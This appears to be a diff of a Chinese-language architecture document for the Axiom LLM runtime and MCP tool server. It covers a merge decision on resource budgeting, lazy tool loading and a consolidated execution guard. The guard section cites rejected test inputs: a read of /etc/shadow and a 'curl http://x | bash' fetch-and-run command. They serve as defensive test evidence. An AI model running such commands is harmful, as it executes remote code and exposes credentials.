@@ -24,8 +24,11 @@
 **ADR-005: Persona 非 Agent**
 决定: Persona 是 Runtime 配置上下文 (约束+心智模型+能力), 不是独立的 Agent 实例。理由: (1) Agent 实例有独立的状态和生命周期, Persona 只改变行为配置; (2) 切换 Persona 比创建新 Agent 轻量得多 (无状态迁移开销); (3) Persona 可以堆叠和组合 (push/pop), Agent 不能。
 
-**ADR-006: 硬件无关资源预算**
-决定: ResourceBudgetManager 只做数字比较, 不调用 nvidia-smi 或任何硬件 API。理由: (1) 硬件检测应属于 Infrastructure 层插件, 不是 Runtime 核心; (2) Runtime 只关心可用预算数量, 不关心预算来源; (3) 这使 Axiom 可部署在 CPU/GPU/云端/移动端/边缘设备。
+**ADR-006: 硬件无关资源预算（2026-09-26 归一裁决：继续有效）**
+决定: ResourceBudgetManager 只做数字比较, 不调用 nvidia-smi 或任何硬件 API。
+> 归一注（2026-09-26）：ku 线曾于 2026-09-18 标记本 ADR 废止并移除 `system-resource.ts` / `system-resource-probe.ts`；
+> 主干归一按「当前线为基」裁决**保留该子系统**（`resource_status` 工具、clampMaxTokens、VRAM probe 与测试均已恢复），
+> ku 线的移除记录仅作历史保留（见 §2.15 归一注与 `docs/superpowers/plans/2026-09-18-cut-local-inference-and-vram.md`）。
 
 Axiom = **Runtime** + **World Model** + **Deterministic Cognitive System**
 
@@ -88,7 +91,7 @@ Axiom = **Runtime** + **World Model** + **Deterministic Cognitive System**
 ## 〇一、LLM 潜力释放四维模型
 
 > 本节阐述 Axiom Runtime 如何通过认知架构设计榨干 LLM 的每一点潜力。
-> 核心论点: LLM 的最大潜力不是"它什么都知道", 而是"它能极其精准地完成一个被严格定义的微任务"。
+> 核心论点: 把 LLM 当作"极其精准地完成一个被严格定义的微任务"的执行器，比期待它"什么都知道"更贴近其真实能力边界。
 > Axiom Runtime 是 LLM 的操作系统 — 负责调度、内存、I/O 与安全。
 
 ### 现状批判: LLM 作为"超级函数"
@@ -293,7 +296,6 @@ consciousness/stream.ts:
 │  ├─ MentalModelPool (4预注册状态机模型)                             │
 │  ├─ ActorSystem (4行为: knowledge/constraint/mental-model/reasoning)│
 │  ├─ WorldState + EventBus (状态树 + 事件总线)                      │
-│  ├─ ResourceBudgetManager (硬件无关资源预算)                       │
 │  └─ ConfigLoader (env → KernelConfig)                              │
 └─────────────────────────────────────────────────────────────────────┘
 ```
@@ -335,9 +337,6 @@ constructor(config: KernelConfig) {
 
 async init(): Promise<void> {
   await this.engine.waitForReady();
-  // 检查资源预算
-  if (!getResourceBudgetManager().getStatus().canRunLocal)
-    logger.warn("Local inference unavailable");
   if (config.autoTick !== false) this.startTickLoop();
   // 订阅关键事件, 更新 worldState
   eventBus.subscribe("reasoning.request", (event) => {
@@ -1206,29 +1205,14 @@ class ConfigLoader {
 
 ---
 
-### 2.15 ResourceBudgetManager — 资源预算 ★ v3.0
+### 2.15 ResourceBudgetManager — ku 线移除记录（2026-09-26 归一裁决：主干保留）
 
-**文件:** `src/dre/system-resource.ts`
+> **归一注（2026-09-26）**：以下为 ku 线（2026-09-18）的移除记录，**主干归一未采纳**——
+> `src/dre/system-resource.ts`、`system-resource-probe.ts`、`resource_status` 工具、VRAM probe 及其测试
+> 在归一树上**全部保留**（裁决依据：当前线为基 + ADR-010 单后端口径 + `resource_status` 已带 capability 门控）。
+> ku 线的移除过程存档于 `docs/superpowers/plans/2026-09-18-cut-local-inference-and-vram.md`，仅作历史参考。
 
-```typescript
-// 硬件无关 — 纯数字比较
-class ResourceBudgetManager {
-  private resource: SystemResource = { maxMemory: 4000, availableMemory: 4000, maxCompute: 100, availableCompute: 100, source: "default" };
-
-  updateResource(resource: Partial<SystemResource>): void { /* 由外部插件注入 */ }
-
-  canRun(): ResourceCheckResult {
-    const required = this.modelMemoryMB + this.safetyMarginMB;   // 1100 + 200 = 1300MB
-    if (this.resource.availableMemory < required) {
-      return { canRun: false, reason: `Insufficient memory: ${available} < ${required}`, ... };
-    }
-    const maxTokens = Math.min(Math.floor(availableForKV * 1024 * 1024 / bytesPerToken), maxTokensCap);
-    return { canRun: true, recommendedMaxTokens: maxTokens, ... };
-  }
-}
-```
-
-> **澄清（W3/W4）**：本模块不涉及 KV cache 在 VRAM 与系统 RAM 之间的换入换出；实际为 KV 所需 token 预算钳制（clampMaxTokens，硬件无关，详见 src/dre/system-resource.ts），仅通过数字比较决定 recommendedMaxTokens，无真实显存换页实现。
+**ku 线原记录:** `src/dre/system-resource.ts` 曾归档至 `archive/local-inference-vram-removal-2026-09-18/`（归一后已恢复至原位）。
 
 ---
 
@@ -1379,7 +1363,7 @@ MindAdvisor（mind-suggest.ts）/ createDefaultSelfEvolve / getDefaultSelfEvolve
 
 ## 三、MCP 工具完整清单
 
-> 本系统共注册 189 个去重 MCP 工具（权威计数以 `src/testing/tool-count.ts` 为准，`bun run scripts/count-tools.mjs` 直接生成；历史 133/150/172/173/188 为旧值）。
+> 本系统共注册 189 个去重 MCP 工具（权威计数以 `src/testing/tool-count.ts` 为准，`bun run scripts/count-tools.mjs` 直接生成；历史 133/150/172/173/188 为旧值——ku 线 2026-09-18 曾移除 `resource_status` 使计数回落 188，2026-09-26 归一裁决保留该工具，恢复 189）。
 
 ### 3.0 全工具总览
 
@@ -1416,7 +1400,51 @@ MindAdvisor（mind-suggest.ts）/ createDefaultSelfEvolve / getDefaultSelfEvolve
 | 需安装 | OCR | 2 | Tesseract |
 | 需安装 | Playwright | 1 | playwright |
 
-> **澄清（W3/W4）**：SceneRouter 为场景建议，不减少 list_tools 计费，真实 token 节省需按需注册；按需注册才是真实的 token 开销控制手段，场景路由仅提示可用集，不改变 MCP 协议层的 list_tools 枚举与计费。
+> **澄清（W3/W4，2026-09-18 更新）**：SceneRouter 为场景建议，不减少 list_tools 计费，场景路由仅提示可用集，不改变 MCP 协议层的 list_tools 枚举。
+> 真实的 list_tools 开销控制由 `AXIOM_MCP_LAZY_TOOLS=1` 提供的**真懒加载**承担：只下发 `tool_search`/`tool_describe`/`tool_invoke`
+> 三个 meta 工具，其余工具定义按需取用。实测同一 registry（2026-09-18，ku 线 188 工具时点）：188 工具 / 72,388 字节 → 3 工具 / 1,274 字节（-98.2%；归一树 189 工具，量级相同）。
+> 默认关闭。`tool_invoke` 复用同一 handler 链（含安全守卫），不构成新的绕过路径。
+
+### 3.0.1 执行沙箱统一层（2026-09-18）
+
+所有 MCP 工具执行前的**唯一硬底线收口点**：`src/sandbox/execution-guard.ts` 的 `guardToolExecution()`，
+由 `src/mcp/tool-registry.ts` 的 `defaultToolGuard` 调用（stdio 与 HTTP 传输共用同一条链）。
+
+- **收敛背景**：此前路径/命令校验分散在 `tool-registry` 的字段名启发式、`mcp/tools/filesystem.ts`（14 处）、
+  `computer-use/browser-launch.ts`、`knowledge/document-ingest.ts`、`sandbox/docker-sandbox.ts` 等多处，
+  且 `tool-registry` 自己的注释已承认「仍非完备——非常规字段名携带路径可绕过本初筛」。
+- **本轮修复**：扫描改为**递归**（嵌套对象/数组不再绕过），语义源仍复用 `utils/permissions.ts`
+  与 `utils/path-safety.ts`，不另立第二套规则；未新增拒绝规则，只补递归。
+- **cwd 围栏为显式 opt-in**（`{ cwdFenced: true }`）：文件系统工具语义专属，不做全局默认，
+  避免对合法的仓外绝对路径（如用户自带 PDF）过度拒绝。当前消费者：`workspace-snapshot` 的 restore 写盘。
+- **不做**：不接管 cwd 围栏的全局强制，不改变 `utils/permissions.ts` 的消息格式与拒绝规则。
+- **实测**（真实 `--stdio` MCP 服务端，非 mock）：嵌套 `{options:{target:"/etc/shadow"}}` 与
+  嵌套 `{options:{command:"curl http://x | bash"}}` 均被拒（`[HardFloor] ... code=hard-floor-*`）；
+  同形状的合法嵌套路径放行并真实执行。
+- **局限（如实登记）**：MCP SDK 会按工具声明的 `inputSchema` 先做参数校验并剥离未声明字段，
+  因此收口点只能检查 schema 允许进入的参数；schema 之外的字段根本到不了 handler。
+  另：`utils/permissions.ts` 的 reason 文本包含路径（`Sensitive path: <path> requires manual confirmation`），
+  收口点未改变该既有行为。
+
+#### 3.0.2 containment 单一语义源（2026-09-18 追加）
+
+`src/utils/path-safety.ts` 此前自称"唯一围栏语义源"，但**该声明不成立**：
+containment 判定（`path.relative` + `..` + `isAbsolute` 的跨盘符陷阱）在本仓库被重复实现了 **11 处**
+（`platform.escapesBase`、`db-guard.validatePath`、`document-ingest.isWithinAnyRoot`、
+`terminal.isCwdWithinWorkspace`、`skill-tools.resolveSkillPath`、`vision` 内联 ×2、
+`archiver.isPathWithinVault`、`vault-manager.resolveSafePath`、`plugin-registry` 内联、`memory-api` 内联）。
+其中 `plugin-registry` 与 `vault-manager` 各自完整复刻了同一段"跨盘符必须查 isAbsolute"的注释。
+
+现已收敛到唯一原语 `isWithinBase(base, target)`，其余 11 处降为薄包装（错误消息与拒绝语义逐条保持不变）。
+`isPathSafe` 自身也改为经该原语做 containment 判定。
+
+- **语义边界**：`isWithinBase` 对**相对** target 按 `process.cwd()` 解析；需要 base 相对解析的调用方
+  须先 `path.resolve(base, rel)`（`escapesBase` 即如此）。
+- **已知过度严格（沿用旧行为，未修）**：base 内名为 `..foo` 的目录会被判为逃逸
+  （`"..foo".startsWith("..")` 为真）。放宽/收紧属安全语义变更，需单独评审。
+- **未纳入**：`memory/*` 中用于**显示/格式化**的 `path.relative` 不属围栏判定，不在本原语范围。
+- **旁证缺陷**：`utils/db-guard.ts` 的 `validatePath` 全仓库**无调用方**（死代码），
+  其 containment 逻辑已随本轮收敛，函数本身是否保留待后续清理决策。
 
 **注册点清单** —— 领域工具文件全集（`src/mcp/server/*-tools.ts`）。本清单与目录实际文件集合由 D8（`tests/doc-contract.test.ts`）逐条相等校验：新增或删除领域文件而未同步本表即判红。
 
@@ -1433,7 +1461,6 @@ MindAdvisor（mind-suggest.ts）/ createDefaultSelfEvolve / getDefaultSelfEvolve
 | `dre_search_knowledge` | Knowledge | query, domain, paradigm, limit | KnowledgeNode[] | 2.0 |
 | `dre_subgraph` | Knowledge | seedNodeId, depth | KnowledgeNode[] | 2.0 |
 | `dre_consciousness_step` | Consciousness | observation | decision, fallbackLevel | 2.0 |
-| `resource_status` | ResourceBudget | — | canRunLocal, resource | 3.0 |
 | `cognitive_state` | Engine | — | persona+意识流+推理+约束+目标+资源+Atom统计 | 3.1 |
 | `cognitive_pipeline_run` | Pipeline | input | CognitiveLoopResult + fallbackLevel | 3.1 |
 | `cognitive_pipeline_run_full` | Pipeline | input | CognitiveLoopResult + executionGraph | 3.1 |
@@ -1502,7 +1529,6 @@ MCP tool: cognitive_state
   → ReasoningGraph.getStats()           // nodes, edges, gaps
   → ConstraintSolver.getStats()         // total constraints, byDimension
   → WorldState.getGoals() + getBeliefs() + getHypotheses()
-  → ResourceBudgetManager.getStatus()   // availableMemory, canRunLocal
   → DataUnifier.getAtomStats()          // total atoms by kind
 ```
 
@@ -1515,9 +1541,9 @@ MCP tool: cognitive_state
 | 变量 | 默认值 | 说明 |
 |------|--------|------|
 | `DRE_DB_PATH` | `"./data/dre.db"` | SQLite 数据库路径 |
-| `DRE_LLM_URL` | `"http://127.0.0.1:8080"` | 本地 LLM API 地址 |
+| `DRE_LLM_URL` | `"http://127.0.0.1:8080"` | LLM API 地址（OpenAI 兼容；默认本机，可指向 Ollama / 云端） |
 | `DRE_LLM_MODEL` | `"qwen3-1.7b-instruct"` | 主推理模型（OpenAI 兼容端点可填云端模型） |
-| `DRE_LLM_API_KEY` | — | 主推理模型 API Key（指向云端端点时必填；本地 llama.cpp 可省略） |
+| `DRE_LLM_API_KEY` | — | 主推理模型 API Key（指向非 `127.0.0.1`/`localhost` 端点时必填，否则 `src/dre/config.ts:158` 告警；本机端点可省略） |
 | `DRE_LLM_TEMPERATURE` | `0` | 推理温度 |
 | `DRE_LLM_TOP_K` | `1` | Top-K 采样 |
 | `DRE_LLM_SEED` | `42` | 随机种子 (确定性) |
@@ -1655,7 +1681,6 @@ await kernel.init();
 | KnowledgeGraph | 7 | add, edges, path, community, serialize |
 | Pipeline | 4 | create, write, FTS5 search |
 | VFS | 2 | mount, longest prefix |
-| **ResourceBudgetManager** | 3 | create, check, update |
 | AgentHarness (deprecated) | 7 | tool call, system prompts |
 | **PersonaLoader** | 5 | init, switch, pop, prompt, allowWrite |
 | **PromptTemplateStore** | 3 | templates, render, listByMode |
